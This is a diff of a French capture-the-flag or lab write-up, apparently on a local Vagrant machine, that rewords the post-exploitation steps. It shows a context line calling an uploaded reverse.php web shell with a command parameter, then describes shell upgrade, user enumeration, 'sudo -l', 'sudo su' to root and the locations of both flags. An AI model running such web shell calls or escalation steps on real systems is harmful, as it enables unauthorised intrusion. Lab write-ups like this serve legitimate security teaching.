@@ -293,32 +293,29 @@ curl "http://192.168.1.4/assets/fonts/blog/wp-content/uploads/reverse.php?cmd=ba
 ```
 
 ### 🚨 Exploitation Additionnelle
-#### Après établissement de la connexion :
-- **Lancement d'un shell** : Après la connexion réussie via le fichier malveillant, je lance un shell pour interaction directe.
-  
-![image13](https://github.com/user-attachments/assets/586db230-3c5c-4168-bfc8-4df1e1125d54)
-- **Recherche d'utilisateurs** : J'effectue une recherche des utilisateurs ayant accès au bash pour identifier les comptes utilisateurs potentiels à exploiter.
-  
-![image6](https://github.com/user-attachments/assets/8527a26e-9e32-40cf-b4f0-826900248989)
-- **Passage sur un terminal bash classique** : Migration de l'interpréteur de commandes vers un shell bash plus stable et complet.
-  
-![image3](https://github.com/user-attachments/assets/6bad3863-5bf6-4075-a29a-17ebed8a5eb9)
-- **Test de différentes connexions** : J'essaye de me connecter à l'utilisateur `root` puis à l'utilisateur `vagrant` pour évaluer les niveaux d'accès disponibles.
-  
-![image1](https://github.com/user-attachments/assets/b870f668-dd09-4534-91be-14710dd6dd57)
-- **Exécution de la commande `sudo -l`** : Cette commande permet de lister les droits sudo de l'utilisateur courant pour identifier d'autres vecteurs d'escalade de privilèges.
-  
-![image15](https://github.com/user-attachments/assets/9ef2b073-2169-4971-9af2-fbf7454b3fad)
-- **Connexion au compte root** : Utilisation de la commande `sudo su` pour accéder au compte root sans nécessité de mot de passe, confirmant une faille majeure dans la gestion des privilèges.
 
+Lancement d'un shell : Après la connexion réussie via le fichier malveillant, nous lançons un shell pour interaction directe.  
+![image13](https://github.com/user-attachments/assets/586db230-3c5c-4168-bfc8-4df1e1125d54)
+
+Recherche d'utilisateurs : Nous effectuons une recherche des utilisateurs ayant accès au bash pour identifier les comptes utilisateurs potentiels à exploiter.  
+![image6](https://github.com/user-attachments/assets/8527a26e-9e32-40cf-b4f0-826900248989)
+
+Passage sur un terminal bash classique : Migration de l'interpréteur de commandes vers un shell bash plus stable et complet.  
+![image3](https://github.com/user-attachments/assets/6bad3863-5bf6-4075-a29a-17ebed8a5eb9)
+
+Test de différentes connexions : Nous essayons de nous connecter à l'utilisateur `root` puis à l'utilisateur `vagrant` pour évaluer les niveaux d'accès disponibles.  
+![image1](https://github.com/user-attachments/assets/b870f668-dd09-4534-91be-14710dd6dd57)
+
+Exécution de la commande `sudo -l` : Cette commande permet de lister les droits sudo de l'utilisateur courant pour identifier d'autres vecteurs d'escalade de privilèges.  
+![image15](https://github.com/user-attachments/assets/9ef2b073-2169-4971-9af2-fbf7454b3fad)
+
+Connexion au compte root : Utilisation de la commande `sudo su` pour accéder au compte root sans nécessité de mot de passe, confirmant une faille majeure dans la gestion des privilèges.  
 ![image](https://github.com/user-attachments/assets/41e823df-f8f3-4b7c-b767-7e1cc1d25238)
 
-- **Découverte du premier flag** : J'ai trouvé le premier flag dans `/home/james/user.txt`.
-
+Découverte du premier flag : Nous trouvons le premier flag dans `/home/james/user.txt`.  
 ![image](https://github.com/user-attachments/assets/1ab4938a-cb6a-4a3a-889c-5c0fa0b8b83f)
 
-- **Deuxième flag** : J'ai trouvé le deuxième flag dans `/root/root.txt`.
-
+Deuxième flag : Nous trouvons le deuxième flag dans `/root/root.txt`.  
 ![image](https://github.com/user-attachments/assets/056e29c7-5402-489e-9694-2013c5954f56)
 
 ✅ **Nous obtenons un shell interactif sur la machine cible !**
